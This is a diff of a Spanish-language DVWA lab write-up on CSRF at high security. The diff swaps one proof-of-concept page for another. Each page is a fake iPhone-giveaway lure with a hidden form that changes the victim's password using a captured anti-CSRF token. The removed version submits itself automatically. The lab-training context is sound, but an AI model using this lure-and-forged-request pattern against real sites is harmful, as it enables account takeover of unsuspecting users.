@@ -464,38 +464,79 @@ Copiamos el valor del token para posteriormente utilizarlo.
 Guardamos el archivo como dvwa_csrf_high_poc.html:
 
 ```html
-  GNU nano 8.4                                  dvwa_csrf_high_poc.html                                            
 <!DOCTYPE html>
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>¡Gana un iPhone 15!</title>
-    <style>
-      body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-      .card { border: 1px solid #ccc; padding: 20px; width: 300px; margin: auto; box-shadow: 2px 2px 10px #aaa; }
-      .card img { width: 100%; }
-    </style>
-  </head>
-  <body>
-    <div class="card">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/IPhone_15_Pro_vector.svg/800px-IPhone_15>
-      <h2>¡Participa en el sorteo!</h2>
-      <p>Solo por visitar esta página, entras en el sorteo de un iPhone 15.</p>
-    </div>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>🎁 ¡Gana un iPhone 15 Pro Max!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #ffecd2, #fcb69f);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      padding: 2rem;
+      max-width: 400px;
+      text-align: center;
+      animation: fadeIn 1s ease;
+    }
+    .card h1 {
+      color: #e63946;
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+    }
+    .card p {
+      color: #444;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    .prize-img {
+      width: 180px;
+      margin-bottom: 1rem;
+    }
+    .btn {
+      background: #06d6a0;
+      color: #fff;
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #04b384;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎉 ¡Felicidades!</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/IPhone_15_Pro.png/200px-IPhone_15_Pro.png" alt="iPhone 15 Pro" class="prize-img">
+    <p>Has sido seleccionado para reclamar un <strong>iPhone 15 Pro Max GRATIS</strong>.</p>
+    <p>Haz clic en el botón para confirmar tu premio.</p>
 
-    <form action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="GET">
-  <input type="hidden" name="password_new" value="hacked3">
-  <input type="hidden" name="password_conf" value="hacked3">
-  <input type="hidden" name="Change" value="Change">
-  <input type="hidden" name="user_token" value="4c55822e3cfdc291b693dcd8a2519a2b">
-  <input type="submit" value="¡Gana un iPhone!">
+    <form action="http://127.0.0.1:8080/dvwa/vulnerabilities/csrf/" method="POST">
+      <input type="hidden" name="password_new" value="hacked4">
+      <input type="hidden" name="password_conf" value="hacked4">
+      <input type="hidden" name="Change" value="Change">
+      <input type="hidden" name="user_token" value="ea39dfa11c5622dd14e1b10b9074f232">
+      <button type="submit" class="btn">📦 Obtener iPhone</button>
     </form>
-
-
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
+  </div>
+</body>
 </html>
 ```
 
